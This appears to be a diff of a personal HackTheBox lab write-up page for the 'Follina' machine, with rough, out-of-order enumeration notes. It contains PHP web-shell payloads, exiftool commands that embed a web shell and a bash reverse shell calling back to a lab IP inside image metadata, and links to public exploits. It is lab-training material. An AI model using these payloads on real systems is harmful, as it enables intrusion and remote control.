@@ -10,20 +10,10 @@
 <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'><text y='14' font-size='14'>&#127988;</text></svg>">
 </head>
 <body>
-<button id="menu-toggle" aria-label="Toggle navigation">&#9776;</button>
-<div class="layout">
-<aside class="sidebar" id="sidebar">
-  <a class="brand" href="../../index.html">
-    <span class="brand-flag">&#127988;</span>
-    <span class="brand-text"><strong>the-grizzly-bear</strong><small>Cybersecurity Notes &amp; CTF Writeups</small></span>
-  </a>
-  <nav class="nav" id="nav-root" data-current="htb/completed-machines/follina.html" data-root="../.."></nav>
-</aside>
 <main class="content">
   <article class="doc">
   <div class="breadcrumb"><a href="../../index.html">the-grizzly-bear</a> &rsaquo; <a href="../index.html">HackTheBox</a> &rsaquo; <a href="index.html">Completed Machines</a></div>
 <h1 id="title">Follina</h1>
-
 <p>I paste a bit of screenshots here etc, but not everything, or everything I try, also sorry if some are out of order, swapping between windows/tabs etc</p>
 <p class="figure"><a class="img-link" href="follina/untitled.png"><img src="follina/untitled.png" alt="Untitled" loading="lazy"></a></p>
 <p class="figure"><a class="img-link" href="follina/untitled-1.png"><img src="follina/untitled-1.png" alt="Untitled" loading="lazy"></a></p>
@@ -44,7 +34,7 @@
 <p>annnnd find file upload at bottom</p>
 <p class="figure"><a class="img-link" href="follina/untitled-8.png"><img src="follina/untitled-8.png" alt="Untitled" loading="lazy"></a></p>
 <p>not getting anywhere here atm, checking other things</p>
-<p><a href="https://nmap.org/nsedoc/scripts/ldap-rootdse.html" target="_blank" rel="noopener">https://nmap.org/nsedoc/scripts/ldap-rootdse.html</a></p>
+<a class="bookmark" href="https://nmap.org/nsedoc/scripts/ldap-rootdse.html" target="_blank" rel="noopener"><div class="bm-text"><div class="bm-title">ldap-rootdse NSE script — Nmap Scripting Engine documentation</div><div class="bm-desc">How to use the ldap-rootdse NSE script: examples, script-args, and references.</div><div class="bm-url"><img class="bm-icon" src="../../assets/bookmarks/nmap-org-nsedoc-scripts-ldap-rootdse-html-icon.png" alt="" loading="lazy">https://nmap.org/nsedoc/scripts/ldap-rootdse.html</div></div></a>
 <p class="figure"><a class="img-link" href="follina/untitled-9.png"><img src="follina/untitled-9.png" alt="Untitled" loading="lazy"></a></p>
 <p class="figure"><a class="img-link" href="follina/untitled-10.png"><img src="follina/untitled-10.png" alt="Untitled" loading="lazy"></a></p>
 <p class="figure"><a class="img-link" href="follina/untitled-11.png"><img src="follina/untitled-11.png" alt="Untitled" loading="lazy"></a></p>
@@ -52,7 +42,7 @@
 <p class="figure"><a class="img-link" href="follina/untitled-12.png"><img src="follina/untitled-12.png" alt="Untitled" loading="lazy"></a></p>
 <p>ms03-026</p>
 <p class="figure"><a class="img-link" href="follina/untitled-13.png"><img src="follina/untitled-13.png" alt="Untitled" loading="lazy"></a></p>
-<p><a href="https://book.hacktricks.xyz/welcome/readme" target="_blank" rel="noopener">https://book.hacktricks.xyz/welcome/readme</a></p>
+<a class="bookmark" href="https://book.hacktricks.xyz/welcome/readme" target="_blank" rel="noopener"><div class="bm-text"><div class="bm-title">Page not found - HackTricks</div><div class="bm-url"><img class="bm-icon" src="../../assets/bookmarks/book-hacktricks-xyz-welcome-readme-icon.svg" alt="" loading="lazy">https://book.hacktricks.xyz/welcome/readme</div></div></a>
 <pre><code class="language-bash">enum4linux -u "" -p "" 10.129.227.209 &amp;&amp; enum4linux -u "guest" -p "" 10.129.227.209</code></pre>
 <p class="figure"><a class="img-link" href="follina/untitled-14.png"><img src="follina/untitled-14.png" alt="Untitled" loading="lazy"></a></p>
 <pre><code class="language-bash">smbmap -u "" -p "" -P 445 -H 10.129.227.209 &amp;&amp; smbmap -u "guest" -p "" -P 445 -H 10.129.227.209</code></pre>
@@ -115,7 +105,7 @@ connection.modify('uid=USER,ou=USERS,dc=DOMAINM=,dc=DOMAIN',{'sshPublicKey': [(l
 <p>trying uploads, commands etc</p>
 <p>&lt;?php system([cmd]); ?&gt;</p>
 <p>tried burp repeater but it was cluncky with the redirect and new file names</p>
-<p><a href="https://en.wikipedia.org/wiki/List_of_file_signatures" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/List_of_file_signatures</a></p>
+<a class="bookmark" href="https://en.wikipedia.org/wiki/List_of_file_signatures" target="_blank" rel="noopener"><div class="bm-text"><div class="bm-title">List of file signatures - Wikipedia</div><div class="bm-url"><img class="bm-icon" src="../../assets/bookmarks/en-wikipedia-org-wiki-list-of-file-signatures-icon.png" alt="" loading="lazy">https://en.wikipedia.org/wiki/List_of_file_signatures</div></div></a>
 <pre><code class="language-bash">&lt;? eval($_GET['cmd']); ?&gt;
 
 &lt;? system($_GET['cmd']); ?&gt;
@@ -133,18 +123,18 @@ connection.modify('uid=USER,ou=USERS,dc=DOMAINM=,dc=DOMAIN',{'sshPublicKey': [(l
 <p class="figure"><a class="img-link" href="follina/untitled-37.png"><img src="follina/untitled-37.png" alt="Untitled" loading="lazy"></a></p>
 <p>well, trying again, dont get the same error result for the jpg with the same shell 😐</p>
 <p>breaktime</p>
-<p><a href="https://flast101.github.io/php-8.1.0-dev-backdoor-rce/" target="_blank" rel="noopener">https://flast101.github.io/php-8.1.0-dev-backdoor-rce/</a></p>
-<p><a href="https://www.exploit-db.com/exploits/49933" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/49933</a></p>
+<a class="bookmark" href="https://flast101.github.io/php-8.1.0-dev-backdoor-rce/" target="_blank" rel="noopener"><div class="bm-text"><div class="bm-title">php-8.1.0-dev-backdoor-rce</div><div class="bm-desc">PHP 8.1.0-dev Backdoor System Shell Script</div><div class="bm-url">https://flast101.github.io/php-8.1.0-dev-backdoor-rce/</div></div></a>
+<a class="bookmark" href="https://www.exploit-db.com/exploits/49933" target="_blank" rel="noopener"><div class="bm-text"><div class="bm-title">PHP 8.1.0-dev - &#x27;User-Agentt&#x27; Remote Code Execution</div><div class="bm-desc">PHP 8.1.0-dev - &#x27;User-Agentt&#x27; Remote Code Execution.. webapps exploit for PHP platform</div><div class="bm-url"><img class="bm-icon" src="../../assets/bookmarks/www-exploit-db-com-exploits-49933-icon.ico" alt="" loading="lazy">https://www.exploit-db.com/exploits/49933</div></div><div class="bm-img"><img src="../../assets/bookmarks/www-exploit-db-com-exploits-49933.png" alt="" loading="lazy"></div></a>
 <p class="figure"><a class="img-link" href="follina/untitled-38.png"><img src="follina/untitled-38.png" alt="Untitled" loading="lazy"></a></p>
-<p><a href="https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/revshell_php_8.1.0-dev.py" target="_blank" rel="noopener">https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/revshell_php_8.1.0-dev.py</a></p>
+<a class="bookmark" href="https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/revshell_php_8.1.0-dev.py" target="_blank" rel="noopener"><div class="bm-text"><div class="bm-title">php-8.1.0-dev-backdoor-rce/revshell_php_8.1.0-dev.py at main · flast101/php-8.1.0-dev-backdoor-rce</div><div class="bm-desc">PHP 8.1.0-dev Backdoor System Shell Script. Contribute to flast101/php-8.1.0-dev-backdoor-rce development by creating an account on GitHub.</div><div class="bm-url"><img class="bm-icon" src="../../assets/bookmarks/github-com-flast101-php-8-1-0-dev-backdoor-rce-blob-main-rev-icon.png" alt="" loading="lazy">https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/revshell_php_8.1.0-dev.py</div></div><div class="bm-img"><img src="../../assets/bookmarks/github-com-flast101-php-8-1-0-dev-backdoor-rce-blob-main-rev.png" alt="" loading="lazy"></div></a>
 <p class="figure"><a class="img-link" href="follina/untitled-39.png"><img src="follina/untitled-39.png" alt="Untitled" loading="lazy"></a></p>
 <p class="figure"><a class="img-link" href="follina/untitled-40.png"><img src="follina/untitled-40.png" alt="Untitled" loading="lazy"></a></p>
-<p><a href="https://github.com/CalegariMindSec/Exploit-PHP-8.1.0/blob/master/php_8.1_rce.sh" target="_blank" rel="noopener">https://github.com/CalegariMindSec/Exploit-PHP-8.1.0/blob/master/php_8.1_rce.sh</a></p>
+<a class="bookmark" href="https://github.com/CalegariMindSec/Exploit-PHP-8.1.0/blob/master/php_8.1_rce.sh" target="_blank" rel="noopener"><div class="bm-text"><div class="bm-title">Exploit-PHP-8.1.0/php_8.1_rce.sh at master · CalegariMindSec/Exploit-PHP-8.1.0</div><div class="bm-desc">Contribute to CalegariMindSec/Exploit-PHP-8.1.0 development by creating an account on GitHub.</div><div class="bm-url"><img class="bm-icon" src="../../assets/bookmarks/github-com-calegarimindsec-exploit-php-8-1-0-blob-master-php-icon.png" alt="" loading="lazy">https://github.com/CalegariMindSec/Exploit-PHP-8.1.0/blob/master/php_8.1_rce.sh</div></div><div class="bm-img"><img src="../../assets/bookmarks/github-com-calegarimindsec-exploit-php-8-1-0-blob-master-php.png" alt="" loading="lazy"></div></a>
 <p class="figure"><a class="img-link" href="follina/untitled-41.png"><img src="follina/untitled-41.png" alt="Untitled" loading="lazy"></a></p>
-<p><a href="https://github.com/guardrailsio/awesome-php-security" target="_blank" rel="noopener">https://github.com/guardrailsio/awesome-php-security</a></p>
-<p><a href="https://github.com/CFandR-github/PHP-binary-bugs/tree/main/cve_2022_31626_remote_exploit" target="_blank" rel="noopener">https://github.com/CFandR-github/PHP-binary-bugs/tree/main/cve_2022_31626_remote_exploit</a></p>
+<a class="bookmark" href="https://github.com/guardrailsio/awesome-php-security" target="_blank" rel="noopener"><div class="bm-text"><div class="bm-title">GitHub - guardrailsio/awesome-php-security: Awesome PHP Security Resources 🕶🐘🔐</div><div class="bm-desc">Awesome PHP Security Resources 🕶🐘🔐. Contribute to guardrailsio/awesome-php-security development by creating an account on GitHub.</div><div class="bm-url"><img class="bm-icon" src="../../assets/bookmarks/github-com-guardrailsio-awesome-php-security-icon.png" alt="" loading="lazy">https://github.com/guardrailsio/awesome-php-security</div></div></a>
+<a class="bookmark" href="https://github.com/CFandR-github/PHP-binary-bugs/tree/main/cve_2022_31626_remote_exploit" target="_blank" rel="noopener"><div class="bm-text"><div class="bm-title">PHP-binary-bugs/cve_2022_31626_remote_exploit at main · CFandR-github/PHP-binary-bugs</div><div class="bm-desc">PHP binary bugs advisory . Contribute to CFandR-github/PHP-binary-bugs development by creating an account on GitHub.</div><div class="bm-url"><img class="bm-icon" src="../../assets/bookmarks/github-com-cfandr-github-php-binary-bugs-tree-main-cve-2022--icon.png" alt="" loading="lazy">https://github.com/CFandR-github/PHP-binary-bugs/tree/main/cve_2022_31626_remote_exploit</div></div></a>
 <p><a href="https://www.cvedetails.com/vulnerability-list.php?vendor_id=74&amp;amp;product_id=128&amp;amp;version_id=0&amp;amp;page=1&amp;amp;hasexp=0&amp;amp;opdos=0&amp;amp;opec=0&amp;amp;opov=0&amp;amp;opcsrf=0&amp;amp;opgpriv=0&amp;amp;opsqli=0&amp;amp;opxss=0&amp;amp;opdirt=0&amp;amp;opmemc=0&amp;amp;ophttprs=0&amp;amp;opbyp=0&amp;amp;opfileinc=0&amp;amp;opginf=0&amp;amp;cvssscoremin=0&amp;amp;cvssscoremax=0&amp;amp;year=0&amp;amp;cweid=0&amp;amp;order=1&amp;amp;trc=604&amp;amp;sha=d8a9f07b702ae6252893a7ef73f2f2812bbcbb8a" target="_blank" rel="noopener">https://www.cvedetails.com/vulnerability-list.php?vendor_id=74&amp;product_id=128&amp;version_id=0&amp;page=1&amp;hasexp=0&amp;opdos=0&amp;opec=0&amp;opov=0&amp;opcsrf=0&amp;opgpriv=0&amp;opsqli=0&amp;opxss=0&amp;opdirt=0&amp;opmemc=0&amp;ophttprs=0&amp;opbyp=0&amp;opfileinc=0&amp;opginf=0&amp;cvssscoremin=0&amp;cvssscoremax=0&amp;year=0&amp;cweid=0&amp;order=1&amp;trc=604&amp;sha=d8a9f07b702ae6252893a7ef73f2f2812bbcbb8a</a></p>
-<p><a href="https://github.com/CFandR-github/PHP-binary-bugs/blob/main/cve_2022_31626_remote_exploit/cve_writeup.md" target="_blank" rel="noopener">https://github.com/CFandR-github/PHP-binary-bugs/blob/main/cve_2022_31626_remote_exploit/cve_writeup.md</a></p>
+<a class="bookmark" href="https://github.com/CFandR-github/PHP-binary-bugs/blob/main/cve_2022_31626_remote_exploit/cve_writeup.md" target="_blank" rel="noopener"><div class="bm-text"><div class="bm-title">PHP-binary-bugs/cve_2022_31626_remote_exploit/cve_writeup.md at main · CFandR-github/PHP-binary-bugs</div><div class="bm-desc">PHP binary bugs advisory . Contribute to CFandR-github/PHP-binary-bugs development by creating an account on GitHub.</div><div class="bm-url"><img class="bm-icon" src="../../assets/bookmarks/github-com-cfandr-github-php-binary-bugs-blob-main-cve-2022--icon.png" alt="" loading="lazy">https://github.com/CFandR-github/PHP-binary-bugs/blob/main/cve_2022_31626_remote_exploit/cve_writeup.md</div></div><div class="bm-img"><img src="../../assets/bookmarks/github-com-cfandr-github-php-binary-bugs-blob-main-cve-2022-.png" alt="" loading="lazy"></div></a>
 <p><a href="https://twitter.com/search?q=CVE-2022-31626&amp;amp;src=typed_query" target="_blank" rel="noopener">https://twitter.com/search?q=CVE-2022-31626&amp;src=typed_query</a></p>
 <p>not thinking this is the vector for a “very easy” box…</p>
 <p class="figure"><a class="img-link" href="follina/untitled-42.png"><img src="follina/untitled-42.png" alt="Untitled" loading="lazy"></a></p>
@@ -172,7 +162,7 @@ connection.modify('uid=USER,ou=USERS,dc=DOMAINM=,dc=DOMAIN',{'sshPublicKey': [(l
 <p>trying infor from the created users</p>
 <p class="figure"><a class="img-link" href="follina/untitled-52.png"><img src="follina/untitled-52.png" alt="Untitled" loading="lazy"></a></p>
 <p class="figure"><a class="img-link" href="follina/untitled-53.png"><img src="follina/untitled-53.png" alt="Untitled" loading="lazy"></a></p>
-<p><a href="https://pentest.blog/exploiting-second-order-sqli-flaws-by-using-burp-custom-sqlmap-tamper/" target="_blank" rel="noopener">https://pentest.blog/exploiting-second-order-sqli-flaws-by-using-burp-custom-sqlmap-tamper/</a></p>
+<a class="bookmark" href="https://pentest.blog/exploiting-second-order-sqli-flaws-by-using-burp-custom-sqlmap-tamper/" target="_blank" rel="noopener"><div class="bm-text"><div class="bm-title">Exploiting Second Order SQLi Flaws by using Burp &amp; Custom Sqlmap Tamper – Pentest Blog</div><div class="bm-url"><img class="bm-icon" src="../../assets/bookmarks/pentest-blog-exploiting-second-order-sqli-flaws-by-using-bur-icon.png" alt="" loading="lazy">https://pentest.blog/exploiting-second-order-sqli-flaws-by-using-burp-custom-sqlmap-tamper/</div></div></a>
 <p>names of form data</p>
 <p>POST /adduser.php HTTP/1.1<br>
 Host: 10.129.221.91<br>
@@ -217,22 +207,22 @@ Content-Disposition: form-data; name="contactno"</p>
 <p><a href="http://10.129.221.91/user/deactivate-account.php" target="_blank" rel="noopener">http://10.129.221.91/user/deactivate-account.php</a></p>
 <p class="figure"><a class="img-link" href="follina/untitled-57.png"><img src="follina/untitled-57.png" alt="Untitled" loading="lazy"></a></p>
 <p class="figure"><a class="img-link" href="follina/untitled-58.png"><img src="follina/untitled-58.png" alt="Untitled" loading="lazy"></a></p>
-<p><a href="https://app.notion.com" target="_blank" rel="noopener">https://app.notion.com</a></p>
+<a class="bookmark" href="https://app.notion.com" target="_blank" rel="noopener"><div class="bm-text"><div class="bm-title">Notion | Where teams and agents work together</div><div class="bm-desc">A collaborative AI workspace, built on your company context. Build and orchestrate agents right alongside your team</div><div class="bm-url"><img class="bm-icon" src="../../assets/bookmarks/app-notion-com-icon.ico" alt="" loading="lazy">https://app.notion.com</div></div><div class="bm-img"><img src="../../assets/bookmarks/app-notion-com.png" alt="" loading="lazy"></div></a>
 <p class="figure"><a class="img-link" href="follina/untitled-59.png"><img src="follina/untitled-59.png" alt="Untitled" loading="lazy"></a></p>
-<p><a href="https://github.com/dlegs/php-jpeg-injector" target="_blank" rel="noopener">https://github.com/dlegs/php-jpeg-injector</a></p>
-<p><a href="https://www.secjuice.com/htb-magic-walkthrough/" target="_blank" rel="noopener">https://www.secjuice.com/htb-magic-walkthrough/</a></p>
+<a class="bookmark" href="https://github.com/dlegs/php-jpeg-injector" target="_blank" rel="noopener"><div class="bm-text"><div class="bm-title">GitHub - dlegs/php-jpeg-injector: Injects php payloads into jpeg images</div><div class="bm-desc">Injects php payloads into jpeg images. Contribute to dlegs/php-jpeg-injector development by creating an account on GitHub.</div><div class="bm-url"><img class="bm-icon" src="../../assets/bookmarks/github-com-dlegs-php-jpeg-injector-icon.png" alt="" loading="lazy">https://github.com/dlegs/php-jpeg-injector</div></div><div class="bm-img"><img src="../../assets/bookmarks/github-com-dlegs-php-jpeg-injector.png" alt="" loading="lazy"></div></a>
+<a class="bookmark" href="https://www.secjuice.com/htb-magic-walkthrough/" target="_blank" rel="noopener"><div class="bm-text"><div class="bm-title">HTB Magic Walkthrough</div><div class="bm-desc">A technical walk through of the &#x27;Magic&#x27; box on HackTheBox.</div><div class="bm-url"><img class="bm-icon" src="../../assets/bookmarks/www-secjuice-com-htb-magic-walkthrough-icon.png" alt="" loading="lazy">https://www.secjuice.com/htb-magic-walkthrough/</div></div><div class="bm-img"><img src="../../assets/bookmarks/www-secjuice-com-htb-magic-walkthrough.jpg" alt="" loading="lazy"></div></a>
 <p><code>exiftool -DocumentName="&lt;h1&gt;in7rud3r&lt;br&gt;&lt;?php if(isset(\$_REQUEST['cmd'])){echo '&lt;pre&gt;';\$cmd = (\$_REQUEST['cmd']);system(\$cmd);echo '&lt;/pre&gt;';} __halt_compiler();?&gt;&lt;/h1&gt;" image.jpeg</code></p>
 <p><code>exiftool -DocumentName="&lt;?php exec(\"/bin/bash -c 'bash -i &gt; /dev/tcp/10.10.15.126/4444 0&gt;&amp;1'\"); ?&gt;" image.jpeg</code></p>
 <p>└──╼ [★]$ sqlmap -u "<a href="http://10.129.227.209/view-job-post.php?id=1*" target="_blank" rel="noopener">http://10.129.227.209/view-job-post.php?id=1*</a>"</p>
 <p class="figure"><a class="img-link" href="follina/untitled-60.png"><img src="follina/untitled-60.png" alt="Untitled" loading="lazy"></a></p>
-<p><a href="https://github.com/Al1ex/CVE-2021-27928" target="_blank" rel="noopener">https://github.com/Al1ex/CVE-2021-27928</a></p>
+<a class="bookmark" href="https://github.com/Al1ex/CVE-2021-27928" target="_blank" rel="noopener"><div class="bm-text"><div class="bm-title">GitHub - Al1ex/CVE-2021-27928: CVE-2021-27928 MariaDB/MySQL-&#x27;wsrep provider&#x27; 命令注入漏洞</div><div class="bm-desc">CVE-2021-27928 MariaDB/MySQL-&#x27;wsrep provider&#x27; 命令注入漏洞 - Al1ex/CVE-2021-27928</div><div class="bm-url"><img class="bm-icon" src="../../assets/bookmarks/github-com-al1ex-cve-2021-27928-icon.png" alt="" loading="lazy">https://github.com/Al1ex/CVE-2021-27928</div></div><div class="bm-img"><img src="../../assets/bookmarks/github-com-al1ex-cve-2021-27928.png" alt="" loading="lazy"></div></a>
 <p>no repsone for this one</p>
 <p class="figure"><a class="img-link" href="follina/untitled-61.png"><img src="follina/untitled-61.png" alt="Untitled" loading="lazy"></a></p>
 <p>so just still throwing around sql not getting anything different</p>
 <p>took the payload from</p>
-<p><a href="https://github.com/JohnHammond/msdt-follina/blob/main/follina.py" target="_blank" rel="noopener">https://github.com/JohnHammond/msdt-follina/blob/main/follina.py</a></p>
+<a class="bookmark" href="https://github.com/JohnHammond/msdt-follina/blob/main/follina.py" target="_blank" rel="noopener"><div class="bm-text"><div class="bm-title">msdt-follina/follina.py at main · JohnHammond/msdt-follina</div><div class="bm-desc">Codebase to generate an msdt-follina payload. Contribute to JohnHammond/msdt-follina development by creating an account on GitHub.</div><div class="bm-url"><img class="bm-icon" src="../../assets/bookmarks/github-com-johnhammond-msdt-follina-blob-main-follina-py-icon.png" alt="" loading="lazy">https://github.com/JohnHammond/msdt-follina/blob/main/follina.py</div></div><div class="bm-img"><img src="../../assets/bookmarks/github-com-johnhammond-msdt-follina-blob-main-follina-py.png" alt="" loading="lazy"></div></a>
 <p>used it in</p>
-<p><a href="https://gist.github.com/tothi/66290a42896a97920055e50128c9f040" target="_blank" rel="noopener">https://gist.github.com/tothi/66290a42896a97920055e50128c9f040</a></p>
+<a class="bookmark" href="https://gist.github.com/tothi/66290a42896a97920055e50128c9f040" target="_blank" rel="noopener"><div class="bm-text"><div class="bm-title">The MS-MSDT 0-day Office RCE Proof-of-Concept Payload Building Process</div><div class="bm-desc">The MS-MSDT 0-day Office RCE Proof-of-Concept Payload Building Process - ms-msdt.MD</div><div class="bm-url"><img class="bm-icon" src="../../assets/bookmarks/gist-github-com-tothi-66290a42896a97920055e50128c9f040-icon.png" alt="" loading="lazy">https://gist.github.com/tothi/66290a42896a97920055e50128c9f040</div></div><div class="bm-img"><img src="../../assets/bookmarks/gist-github-com-tothi-66290a42896a97920055e50128c9f040.png" alt="" loading="lazy"></div></a>
 <p>opened doc as zip, changed ext</p>
 <p class="figure"><a class="img-link" href="follina/untitled-62.png"><img src="follina/untitled-62.png" alt="Untitled" loading="lazy"></a></p>
 <p class="figure"><a class="img-link" href="follina/untitled-63.png"><img src="follina/untitled-63.png" alt="Untitled" loading="lazy"></a></p>
@@ -262,14 +252,7 @@ trying this</code></pre>
 <p class="figure"><a class="img-link" href="follina/untitled-69.png"><img src="follina/untitled-69.png" alt="Untitled" loading="lazy"></a></p>
 <p class="figure"><a class="img-link" href="follina/untitled-70.png"><img src="follina/untitled-70.png" alt="Untitled" loading="lazy"></a></p>
   </article>
-  <footer class="foot">Built from a Notion export · <a href="https://github.com/the-grizzly-bear">github.com/the-grizzly-bear</a></footer>
+  <footer class="foot"><a href="https://github.com/the-grizzly-bear">github.com/the-grizzly-bear</a></footer>
 </main>
-</div>
-<script src="../../assets/nav.js" defer></script>
-<script>
-document.getElementById('menu-toggle').addEventListener('click',function(){
-  document.getElementById('sidebar').classList.toggle('open');
-});
-</script>
 </body>
 </html>
